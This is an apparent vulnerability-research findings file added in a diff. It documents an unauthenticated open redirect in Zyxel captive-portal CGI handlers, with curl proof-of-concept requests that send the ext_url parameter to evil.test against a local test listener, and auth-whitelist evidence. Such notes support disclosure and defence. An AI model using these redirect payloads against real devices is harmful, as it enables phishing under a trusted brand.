@@ -1,0 +1,21 @@
+[ui_vuln_sweep_20260423ak_iprep_brand_sibling]
+date=2026-04-23
+focus=Sibling confirmation for branded-host open redirect on ip_reputation_block.cgi plus auth/config evidence
+listener=http://127.0.0.1:8080
+branded_host=nap-slogin.nebula.zyxel.com
+branded_host_route_evidence=runroot/usr/local/lighttpd/conf/lighttpd.conf lines 33-34 apply host-specific captive-portal rewrite for nap-slogin.nebula.zyxel.com to /cgi-bin/tmp/captive-portal/
+request_1=curl -sS -D - -o /dev/null --max-time 8 -H 'Host: nap-slogin.nebula.zyxel.com:8080' 'http://127.0.0.1:8080/cgi-bin/ip_reputation_block.cgi?host=example.com&ext_url=https://example.com/path'
+result_1=HTTP/1.1 302 Found | Location: https://example.com/path?threat_url=example.com&threat_type=
+request_2=curl -sS -D - -o /dev/null --max-time 8 -H 'Host: nap-slogin.nebula.zyxel.com:8080' 'http://127.0.0.1:8080/cgi-bin/ip_reputation_block.cgi?host=example.com&ext_url=https://evil.test/path'
+result_2=HTTP/1.1 302 Found | Location: https://evil.test/path?threat_url=example.com&threat_type=
+request_3=curl -sS -D - -o /dev/null --max-time 8 -H 'Host: nap-slogin.nebula.zyxel.com:8080' 'http://127.0.0.1:8080/cgi-bin/ip_reputation_block.cgi?host=example.com&ext_url=//evil.test/path'
+result_3=HTTP/1.1 302 Found | Location: //evil.test/path?threat_url=example.com&threat_type=
+auth_skip_evidence=runroot/usr/local/lighttpd/conf/conf.d/auth_zyxel.conf lines 35-38 whitelist /cdr.cgi /ip_reputation_block.cgi /dns_filter.cgi /cloud_idp_login.cgi in AuthZyxelSkipPattern
+config_model_evidence_dns=runroot/usr/local/share/dns-filter/dns-filter.yin lines 115-127 define block-page-type choice with int-page or configured ext-page
+config_model_evidence_iprep=runroot/usr/local/share/ip-reputation/ip-reputation.yin lines 45-57 define block-page-type choice with int-page or configured ext-page
+current_implication=The branded-host phishing/brand-abuse impact applies to both unauthenticated helper handlers, not just dns_filter.cgi. Request-side ext_url overrides the redirect destination even though the shipped config model presents ext-page as a server-side policy URI.
+static_sink_evidence_dns=strings -a runroot/usr/local/lighttpd/cgi-bin/dns_filter.cgi exposes host, ext_url, is_valid_host, and Location: %s?threat_url=%s&threat_type=%s%s
+static_sink_evidence_iprep=strings -a runroot/usr/local/lighttpd/cgi-bin/ip_reputation_block.cgi exposes host, ext_url, is_valid_host, and Location: %s?threat_url=%s&threat_type=%s
+scheme_relative_dns=request with ext_url=//evil.test/path returns Location: //evil.test/path?threat_url=example.com&threat_type=Unknown
+scheme_relative_iprep=request with ext_url=//evil.test/path returns Location: //evil.test/path?threat_url=example.com&threat_type=
+claim_boundary=Promote as unauthenticated arbitrary redirect with trusted-host phishing/brand-abuse impact. Do not claim browser script execution or response splitting from this artifact.
